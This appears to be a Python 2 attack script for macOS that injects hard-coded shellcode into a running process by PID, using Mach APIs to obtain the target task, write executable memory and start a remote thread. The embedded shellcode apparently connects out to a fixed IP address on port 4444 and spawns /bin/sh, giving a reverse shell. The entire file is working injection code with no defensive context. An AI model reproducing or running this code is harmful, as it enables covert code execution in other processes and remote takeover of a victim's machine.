import ctypes
from ctypes import *
import ctypes.util 
import sys
import pdb
import os
import struct
#Original here: https://github.com/secretsquirrel/osx_mach_stuff/blob/master/inject.c
#http://www.newosxbook.com/src.jl?tree=listings&file=inject.c

STACK_SIZE = 65536
VM_FLAGS_ANYWHERE = 0x0001
VM_PROT_READ = 0x01 
VM_PROT_EXECUTE = 0x04
x86_THREAD_STATE64 = 4
KERN_SUCCESS = 0

remoteTask = ctypes.c_long()
remoteCode64 = ctypes.c_uint64()
remoteStack64 = ctypes.c_uint64()
remoteThread = ctypes.c_long()

cdll.LoadLibrary('/usr/lib/libc.dylib')
libc = CDLL('/usr/lib/libc.dylib')

shellcode =  ""
shellcode += "\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31"
shellcode += "\xd2\x0f\x05\x49\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00"
shellcode += "\x02\x48\x31\xf6\x56\x48\xbe\x00\x02\x11\x5c\x0a\x14"
shellcode += "\x00\x84\x56\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x4c\x89"
shellcode += "\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
shellcode += "\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b"
shellcode += "\x00\x00\x02\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2\x52\x57\x48"
shellcode += "\x89\xe6\x0f\x05"
#RemoteThreadState Struct
class remoteThreadState64(ctypes.Structure):

	_fields_ = [

		("__rax", ctypes.c_uint64),
		("__rbx", ctypes.c_uint64),
		("__rcx", ctypes.c_uint64),
		("__rdx", ctypes.c_uint64),
		("__rdi", ctypes.c_uint64),
		("__rsi", ctypes.c_uint64),
		("__rbp", ctypes.c_uint64),
		("__rsp", ctypes.c_uint64),
		("__r8", ctypes.c_uint64),
		("__r9", ctypes.c_uint64),
		("__r10", ctypes.c_uint64),
		("__r11", ctypes.c_uint64),
		("__r12", ctypes.c_uint64),
		("__r13", ctypes.c_uint64),
		("__r14", ctypes.c_uint64),
		("__r15", ctypes.c_uint64),
		("__rip", ctypes.c_uint64),
		("__rflags", ctypes.c_uint64),
		("__cs", ctypes.c_uint64),
		("__fs", ctypes.c_uint64),
		("__gs", ctypes.c_uint64)
	]

#Don't need the dylib path, just pass in garbage characters, not used
if len(sys.argv) != 2:
	print "Usage: %s <pid>" % str(sys.argv[0])
	sys.exit()

pid = int(sys.argv[1])

#pdb.set_trace()
#Get the handle/task for the process w/ the pid. 
result = libc.task_for_pid(libc.mach_task_self(), pid, ctypes.byref(remoteTask))
if (result != KERN_SUCCESS):
	print "Unable to get task for pid\n"
	sys.exit() 
#Allocate memory in the process for the stack
result = libc.mach_vm_allocate(remoteTask, ctypes.byref(remoteStack64), STACK_SIZE, VM_FLAGS_ANYWHERE)
if result != KERN_SUCCESS:
	print "Unable to allocate memory for the remote stack\n"
	sys.exit()
#Allocate memory in the process for the code
result = libc.mach_vm_allocate(remoteTask, ctypes.byref(remoteCode64),len(shellcode),VM_FLAGS_ANYWHERE)
if result != KERN_SUCCESS:
	print "Unable to allocate memory for the remote code\n"
	sys.exit()
#create an empty ptr to a unsigned long
longptr = ctypes.POINTER(ctypes.c_ulong)
#cast the shellcode to the unsigned long
#pdb.set_trace()

shellcodePtr = ctypes.cast(shellcode, longptr)
#Write our shellcode to memory

result = libc.mach_vm_write(remoteTask, remoteCode64, shellcodePtr, len(shellcode))
if result != KERN_SUCCESS:
	print "Unable to write process memory\n"
	sys.exit()
#Set permissions 
result = libc.vm_protect(remoteTask, remoteCode64, len(shellcode),False, (VM_PROT_READ | VM_PROT_EXECUTE))
if result != KERN_SUCCESS:
	print "Unable to modify permissions for memory\n"
	sys.exit()

emptyarray = bytearray(sys.getsizeof(remoteThreadState64))

threadstate64 = remoteThreadState64.from_buffer_copy(emptyarray)

remoteStack64 = int(remoteStack64.value)
remoteStack64 += (STACK_SIZE / 2)
remoteStack64 -= 8

remoteStack64 = ctypes.c_uint64(remoteStack64)

threadstate64.__rip = remoteCode64
threadstate64.__rsp = remoteStack64
threadstate64.__rbp = remoteStack64

x86_THREAD_STATE64_COUNT = ctypes.sizeof(threadstate64) / ctypes.sizeof(ctypes.c_int)

result = libc.thread_create_running(remoteTask,x86_THREAD_STATE64, ctypes.byref(threadstate64), x86_THREAD_STATE64_COUNT, ctypes.byref(remoteThread))
if (result != KERN_SUCCESS):
	print "Unable to execute remote thread in process"
	sys.exit()

print "All Done!!!"
